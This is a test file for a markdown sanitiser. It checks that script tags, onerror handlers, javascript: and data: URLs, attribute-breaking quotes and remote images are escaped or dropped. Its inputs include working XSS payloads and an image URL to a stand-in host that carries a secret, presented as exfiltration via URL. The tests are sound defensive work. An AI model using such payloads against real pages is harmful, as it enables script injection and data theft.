import { describe, expect, it } from "vitest";
import { renderSafeMarkdown } from "../safeMarkdown";

describe("renderSafeMarkdown", () => {
  it("renders normal markdown", () => {
    const html = renderSafeMarkdown("**hola** `x`\n\n- a");
    expect(html).toContain("<strong>hola</strong>");
    expect(html).toContain("<code>x</code>");
    expect(html).toContain("<li>a</li>");
  });

  it("escapes raw HTML blocks and inline tags", () => {
    const html = renderSafeMarkdown('<img src=x onerror="alert(1)">\n\ntexto <script>alert(1)</script>');
    expect(html).not.toMatch(/<img|<script/i);
    expect(html).toContain("&lt;script&gt;");
  });

  it("drops javascript: and other unsafe URLs", () => {
    for (const md of ["[x](javascript:alert(1))", "[x](java\nscript:alert(1))", "[x](JAVASCRIPT:alert(1))", "![i](javascript:alert(1))", "[x](data:text/html,<script>)"]) {
      expect(renderSafeMarkdown(md)).not.toMatch(/href="(?!https?:|mailto:|#)|src="javascript/i);
    }
  });

  it("keeps safe links with noopener", () => {
    const html = renderSafeMarkdown("[doc](https://mariadb.com/kb)");
    expect(html).toContain('href="https://mariadb.com/kb"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("never auto-loads remote images (no exfiltration via URL)", () => {
    for (const md of [
      "![x](https://evil.example/p.png?secret=abc)",
      "![x](http://evil.example/p.png)",
      "![x](HTTPS://evil.example/p.png)",
      '![x](https://evil.example/p.png "titulo")',
    ]) {
      const html = renderSafeMarkdown(md);
      expect(html).not.toMatch(/<img/i);
      expect(html).not.toMatch(/src=/i);
    }
  });

  it("shows remote images as an explicit link the user must click", () => {
    const html = renderSafeMarkdown("![diagrama](https://example.com/d.png)");
    expect(html).toContain('href="https://example.com/d.png"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain("diagrama");
  });

  it("keeps inline data: images", () => {
    const html = renderSafeMarkdown("![p](data:image/png;base64,iVBORw0KGgo=)");
    expect(html).toContain('<img src="data:image/png;base64,iVBORw0KGgo="');
  });

  it("escapes alt text of remote image placeholders", () => {
    const html = renderSafeMarkdown('![<b onmouseover="x">](https://example.com/a.png)');
    expect(html).not.toMatch(/<b /i);
  });

  it("escapes attribute-breaking characters in links", () => {
    const html = renderSafeMarkdown('[x](https://a.com/"onmouseover="alert(1))');
    expect(html).not.toContain('"onmouseover="');
  });
});
